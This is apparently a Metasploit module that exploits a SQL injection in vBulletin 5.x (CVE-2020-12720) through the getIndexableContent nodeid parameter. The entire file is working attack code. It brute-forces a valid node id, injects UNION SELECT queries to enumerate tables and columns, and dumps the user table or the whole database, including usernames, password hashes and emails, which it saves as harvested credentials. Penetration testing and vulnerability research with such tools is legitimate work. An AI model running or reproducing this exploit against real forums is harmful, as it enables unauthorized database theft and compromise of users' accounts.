##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  HttpFingerprint = { method: 'GET', uri: '/', pattern: [/vBulletin.version = '5.+'/] }.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'vBulletin /ajax/api/content_infraction/getIndexableContent nodeid Parameter SQL Injection',
        'Description' => %q{
          This module exploits a SQL injection vulnerability found in vBulletin 5.x.x to dump the user
          table information or to dump all of the vBulletin tables (based on the selected options). This
          module has been tested successfully on VBulletin Version 5.6.1 on Ubuntu Linux.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Charles Fol <folcharles[at]gmail.com>', # (@cfreal_) CVE
          'Zenofex <zenofex[at]exploitee.rs>' # (@zenofex) PoC and Metasploit module
        ],
        'References' => [
          ['CVE', '2020-12720']
        ],
        'Actions' => [
          ['DumpUser', { 'Description' => 'Dump only user table used by vbulletin.' }],
          ['DumpAll', { 'Description' => 'Dump all tables used by vbulletin.' }]
        ],
        'DefaultAction' => 'DumpUser',
        'DisclosureDate' => '2020-03-12'
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to vBulletin', '/']),
      OptInt.new('NODE', [false, 'Valid Node ID']),
      OptInt.new('MINNODE', [true, 'Valid Node ID', 1]),
      OptInt.new('MAXNODE', [true, 'Valid Node ID', 200]),
    ])
  end

  # Performs SQLi attack
  def do_sqli(node_id, tbl_prfx, field, table, condition = nil, limit = nil)
    where_cond = condition.nil? || condition == '' ? '' : "where #{condition}"
    limit_cond = limit.nil? || limit == '' ? '' : "limit #{limit}"
    injection = " UNION ALL SELECT 0x2E,0x74,0x68,0x65,0x2E,0x65,0x78,0x70,0x6C,0x6F,0x69,0x74,0x65,0x65,0x72,0x73,0x2E,#{field},0x2E,0x7A,0x65,0x6E,0x6F,0x66,0x65,0x78 "
    injection << "from #{tbl_prfx}#{table} #{where_cond} #{limit_cond} --"

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'content_infraction', 'getIndexableContent'),
      'vars_post' => {
        'nodeId[nodeid]' => "#{node_id}#{injection}"
      }
    })

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && parsed_resp['rawtext']

    parsed_resp['rawtext']
  end

  # Gets the prefix to the SQL tables used in vbulletin install
  def get_table_prefix(node_id)
    print_status('Attempting to determine the vBulletin table prefix.')
    table_name = do_sqli(node_id, '', 'table_name', 'information_schema.columns', "column_name='phrasegroup_cppermission'")

    unless table_name && table_name.split('language').index
      fail_with(Failure::Unknown, 'Could not determine the vBulletin table prefix.')
    end

    table_prfx = table_name.split('language')[0]
    print_good("Sucessfully retrieved table to get prefix from #{table_name}.")

    table_prfx
  end

  # Brute force a nodeid (attack requires a valid nodeid)
  def brute_force_node
    min = datastore['MINNODE']
    max = datastore['MAXNODE']

    if min > max
      print_error("MINNODE can't be major than MAXNODE.")
      return nil
    end

    for node_id in min..max
      if exists_node?(node_id)
        return node_id
      end
    end

    nil
  end

  # Checks if a nodeid is valid
  def exists_node?(id)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'ajax', 'api', 'node', 'getNode'),
      'vars_post' => {
        'nodeid' => id.to_s
      }
    })

    return nil unless res && res.code == 200 && (parsed_resp = res.get_json_document) && !parsed_resp['errors']

    print_good("Sucessfully found node at id #{id}")
    true
  end

  # Gets a node through BF or user supplied value
  def get_node
    if datastore['NODE'].nil? || datastore['NODE'] <= 0
      print_status('Brute forcing to find a valid node id.')
      return brute_force_node
    end

    print_status("Checking node id '#{datastore['NODE']}'.")
    return datastore['NODE'] if exists_node?(datastore['NODE'])

    nil
  end

  # Report credentials to MSF DB
  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: ssl ? 'https' : 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user]
    }.merge(service_data)

    if opts[:password]
      credential_data.merge!(
        private_data: opts[:password],
        private_type: :nonreplayable_hash,
        jtr_format: 'bcrypt'
      )
    end

    login_data = {
      core: create_credential(credential_data),
      status: opts[:status],
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Get columns for table
  def get_table_columns(node_id, table_prfx, table)
    print_status("Getting table columns for #{table_prfx}#{table}")
    columns_cnt = do_sqli(node_id, '', 'COUNT(COLUMN_NAME)', 'INFORMATION_SCHEMA.COLUMNS', "TABLE_NAME='#{table_prfx}#{table}'")
    fail_with(Failure::UnexpectedReply, "Could not get count of columns for #{table_prfx}#{table}.") unless columns_cnt

    columns = []
    for idx in 0..columns_cnt.to_i
      column = do_sqli(node_id, '', 'COLUMN_NAME', 'INFORMATION_SCHEMA.COLUMNS', "TABLE_NAME='#{table_prfx}#{table}'", "#{idx}, #{idx + 1}")
      columns << column
    end
    print_good("Retrieved #{columns_cnt} columns for #{table_prfx}#{table}")

    columns
  end

  # Gets rows from table
  def get_all_rows(node_id, table_prfx, table, columns)
    print_status("Dumping table #{table_prfx}#{table}")
    field_var = 'concat('
    columns.each do |col|
      if !col.blank?
        field_var << "COALESCE(#{col},''),0x7C,"
      end
    end
    field_var << '\'\')'

    row_cnt = do_sqli(node_id, table_prfx, 'COUNT(*)', "#{table_prfx}#{table}")
    if row_cnt.nil? || row_cnt.to_i < 0
      print_status('Table contains 0 rows, skipping.')
      return nil
    end
    print_status("Table contains #{row_cnt} rows, dumping (this may take a while).")

    rows = []
    for r_idx in 0..row_cnt.to_i - 1
      field_hash = {}
      fields = do_sqli(node_id, table_prfx, field_var.to_s, "#{table_prfx}#{table}", '', "#{r_idx}, #{r_idx + 1}")
      field_list = fields.split('|')
      field_list.each_with_index do |field, f_idx|
        field_hash[columns[f_idx.to_i]] = field.to_s
      end

      unless field_hash['username'].blank? && table != /user/
        print_good("Found credential: #{field_hash['username']}:#{field_hash['token']} (Email: #{field_hash['email']})")
        report_cred(
          ip: rhost,
          port: datastore['RPORT'],
          user: field_hash['username'].to_s,
          password: field_hash['token'].to_s,
          status: Metasploit::Model::Login::Status::UNTRIED,
          jtr_format: 'bcrypt',
          proof: field_hash.to_s
        )
      end

      rows << field_hash
    end
    print_good("Retrieved #{row_cnt} rows for #{table_prfx}#{table}")

    rows
  end

  # Get all tables in database with prefix
  def get_all_tables(node_id, table_prfx)
    print_status('Dumping all table names from INFORMATION_SCHEMA')
    table_cnt = do_sqli(node_id, '', 'COUNT(TABLE_NAME)', 'INFORMATION_SCHEMA.TABLES', "TABLE_NAME like '#{table_prfx}%'")
    fail_with(Failure::UnexpectedReply, "Could not get count of tables with prefix: #{table_prfx}.") unless table_cnt

    tables = []
    for idx in 0..table_cnt.to_i
      table = do_sqli(node_id, '', 'TABLE_NAME', 'INFORMATION_SCHEMA.TABLES', "TABLE_NAME like '#{table_prfx}%'", "#{idx}, #{idx + 1}")
      tables << table
    end
    print_good("Retrieved #{table_cnt} tables for #{table_prfx}")

    tables
  end

  # Stores table data to file on disk
  def store_data(data, name)
    path = store_loot(name, 'text/plain', datastore['RHOST'], data.to_json, name)
    print_good("Saved file to: #{path}")
  end

  # Performs all sql injection functionality
  def run
    # Get node_id for requests
    node_id = get_node
    fail_with(Failure::Unknown, 'Could not get a valid node id for the vBulletin install.') unless node_id

    # Get vBulletin table prefix (from known vb table 'language')
    table_prfx = get_table_prefix(node_id)

    tables = action.name == 'DumpAll' ? get_all_tables(node_id, table_prfx) : ["#{table_prfx}user"]
    tables.each do |table|
      columns = get_table_columns(node_id, '', table)
      rows = get_all_rows(node_id, '', table, columns)
      store_data(rows, table.to_s) unless rows.nil?
    end
  end
end
